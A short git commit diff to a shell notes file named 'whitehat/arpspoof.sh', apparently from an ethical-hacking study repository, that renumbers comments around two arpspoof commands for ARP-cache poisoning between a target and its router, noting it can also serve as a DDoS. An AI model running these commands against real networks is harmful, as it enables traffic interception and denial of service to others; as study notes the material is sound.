dc03f309bd75d04acf39470a513aa936d6f62e82
rebornweb <andrei.nicolas@hotmail.com>
2022-03-13 23:22:28 +1300

    One can be used as ddos

--- whitehat/arpspoof.sh
+++ whitehat/arpspoof.sh
@@ -4,11 +4,10 @@ arp -a
 
 #We tell the target machine that we are the router/spoofing, 
 #changes the MAC of the router on Target to be the hackers PC
-
-#Can also be used as a DDOS attack
+#1Can also be used as a DDOS attack
 arpspoof -i interface -t targetip routerip
 
-#We tell the router that we are actually the target device
+#2We tell the router that we are actually the target device
 arpspoof -i interface -t routerip targetip
 
 #Enable port forwarding from hacker pc, to let packets to follow through like router
